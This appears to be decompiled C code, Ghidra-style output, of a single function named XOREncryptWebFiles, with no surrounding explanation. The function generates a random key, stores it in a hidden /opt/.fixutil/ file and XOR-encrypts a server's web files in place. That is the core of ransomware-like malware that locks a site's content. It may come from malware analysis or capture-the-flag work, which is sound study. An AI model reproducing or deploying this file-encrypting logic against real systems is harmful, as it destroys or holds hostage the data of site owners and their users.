void XOREncryptWebFiles(void)
{
  int iVar1;
  char *str;
  FILE *__stream;
  char **webfiles;
  long lVar2;
  stat *psVar3;
  long in_FS_OFFSET;
  byte bVar4;
  int i;
  int amnt_webfiles;

  char *encryption_key;
  FILE *encryption_file;
  char **webfile_names;
  stat stat_res;
  long local_10;
  
  bVar4 = 0;
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  str = (char *)malloc(0x11);
  if (str == (char *)0x0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  rand_string(str,0x10);
  psVar3 = &stat_res;
  for (lVar2 = 0x12; lVar2 != 0; lVar2 = lVar2 + -1) {
    psVar3->st_dev = 0;
    psVar3 = (stat *)((long)psVar3 + (ulong)bVar4 * -0x10 + 8);
  }
  iVar1 = stat(encryption_key_dir,(stat *)&stat_res);
  if (iVar1 == -1) {
    mkdir(encryption_key_dir,0x1c0);
  }
  __stream = fopen("/opt/.fixutil/backup.txt","a");
  fprintf(__stream,"%s\n",str);
  fclose(__stream);
  webfiles = (char **)malloc(8);
  if (webfiles == (char **)0x0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  iVar1 = GetWebFiles(webfiles,8);
  for (i = 0; i < iVar1; i = i + 1) {
    XORFile(webfiles[i],str);
    free(webfiles[i]);
  }
  free(webfiles);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
